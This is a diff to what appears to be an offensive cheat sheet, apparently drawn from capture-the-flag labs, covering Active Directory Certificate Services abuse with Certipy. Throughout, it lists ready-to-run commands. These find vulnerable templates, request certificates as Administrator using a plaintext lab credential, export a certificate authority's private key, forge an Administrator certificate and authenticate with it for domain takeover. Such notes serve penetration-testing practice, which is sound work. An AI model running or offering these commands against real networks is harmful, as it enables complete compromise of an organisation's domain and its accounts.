@@ -521,8 +521,14 @@ certipy-ad find -u 'Lion.SK' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -vulnerable -enabl
 certipy-ad req -u 'Lion.SK' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -ca 'Certificate-LTD-CA' -template 'Delegated-CRA' -debug -dynamic-endpoint
 certipy-ad req -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096'
 
++---------- Export PFX ----------+
+certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
 
++---------- Forge Certificate ----------+
+certipy forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@EXAMPLE.LOCAL -subject 'CN=ADMINISTRATOR,CN=USERS,DC=EXAMPLE,DC=LOCAL'
 
++---------- Authenticate Certificate ----------+
+certipy auth -dc-ip $TARGET -pfx 'administrator_forged.pfx'
 
 [*] (88) Kerberos
 +---------- Clock skew ----------+
